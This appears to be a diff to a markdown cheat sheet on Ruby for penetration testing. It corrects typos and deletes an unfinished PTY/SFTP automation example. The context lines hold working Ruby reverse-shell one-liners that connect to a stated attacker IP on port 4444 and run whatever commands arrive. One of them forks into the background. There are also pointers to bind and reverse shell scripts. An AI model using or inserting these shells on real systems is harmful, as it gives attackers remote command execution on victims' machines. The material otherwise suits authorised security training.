@@ -20,14 +20,14 @@ if you don't whant to rely on `/bin/sh`
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
-if you don't whant to rely on `cmd.exe`
+if you don't want to rely on `cmd.exe`
 ```ruby
 ruby -rsocket -e 'c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
 since `192.168.0.13` is the attacker IP
 
-If you what it as more flixable script file
+If you want it more flexible script file
 
 ```ruby
 #!/usr/bin/env ruby
@@ -53,45 +53,6 @@ ruby ncat.rb -cv -r RHOST -p 443
 
 ## Bind and Reverse shell 
 This is an awesome implementation for a standalone  [bind][1] and [reverse][2] shells scripts written by [Hood3dRob1n][3] on github . The bind shell requires authentication while reverse is not.
-
-
-
-
-## Pseudo Terminal (PTY)
-To be fixed
-```ruby
-# https://gist.github.com/kwent/e2c34c2dfd01a194a49a
-# http://ruby-doc.org/stdlib-2.2.0/libdoc/pty/rdoc/PTY.html
-
-require 'pty'
-require 'expect'
-PTY.spawn('sftp username@sftp.domain.com:/uploads') do |input, output|
-  # Say yes to SSH fingerprint
-  input.expect(/fingerprint/, 2) do |r|
-    output.puts "yes" if !r.nil?
-    # Enter SFTP password
-    input.expect(/password/, 2) do |r|
-      output.puts 'your_sftp_password' if !r.nil?
-      input.expect(/sftp/) do
-        # List folders and files in `/uploads`
-        output.puts 'ls'
-        # Check if folder named `foo` exist
-        input.expect(/foo/, 1) do |result|
-          is_folder_exist = result.nil? ? false : true
-          # Create `foo` folder if does'nt exist
-          output.puts "mkdir foo" if !is_folder_exist
-          # Change directory to `foo`
-          output.puts "cd foo"
-          # Upload `/path/to/local/foo.txt` in `foo` folder as `foo.txt`
-          output.puts "put /path/to/local/foo.txt foo.txt"
-          # Exit SFTP
-          output.puts "exit"
-        end
-      end
-    end
-  end
-end
-```
 
 
 
